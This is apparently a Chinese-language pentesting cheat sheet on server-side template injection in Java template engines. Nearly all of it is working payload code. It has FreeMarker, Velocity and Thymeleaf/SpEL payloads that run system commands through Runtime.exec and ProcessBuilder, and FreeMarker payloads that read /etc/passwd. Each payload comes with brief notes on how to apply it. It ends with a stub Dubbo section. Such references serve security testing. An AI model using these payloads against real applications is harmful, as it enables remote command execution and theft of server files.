# 代码执行











# 模板注入SSTI

## FreeMarker

> FreeMarker拥有自己的模板编写规则并使用FTL表示，即FreeMarker模板语言，比如:myweb.html**.ftl**就是一个FreeMarker模板文件
>
> Freemarker可利用的点在于模版语法本身，直接渲染用户输入payload会被转码而失效，所以**一般的利用场景为上传或者修改模版文件**

poc

命令执行：

```java
<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("open -a Calculator.app"")}
```

```java
<#assign value="freemarker.template.utility.ObjectConstructor"new()>${value("java.lang.ProcessBuilder","whoami").start()}
```

```java
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")
```

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("open -a Calculator.app") }
```

文件读取：

```java
<#assign is=object?api.class.getResourceAsStream("/Test.class")>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

```java
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

> 这里利用载荷是要把上面的Object替换替换成可编辑模板中可用的真实的Object后利用才行



## velocity

poc

```java
// 命令执行1
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open -a Calculator")

// 命令执行2 
#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))##
#set($chr = $x.class.forName('java.lang.Character'))##
#set($str = $x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

// 命令执行3
#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\A"))
#if($scan.hasNext())
$scan.next()
#end
```

## Thymeleaf

poc实质上是spel表达式注入

命令执行

```java
// 参数传参
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x
    
// 路径传参
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x
```



# Dubbo--20880端口

**dubbo是一个基于Spring的RPC（远程过程调用）框架，能够实现服务的远程调用、服务的治理**

![t01dd60f99ea19aec96](../..\../source\images\t01dd60f99ea19aec96.jpg)
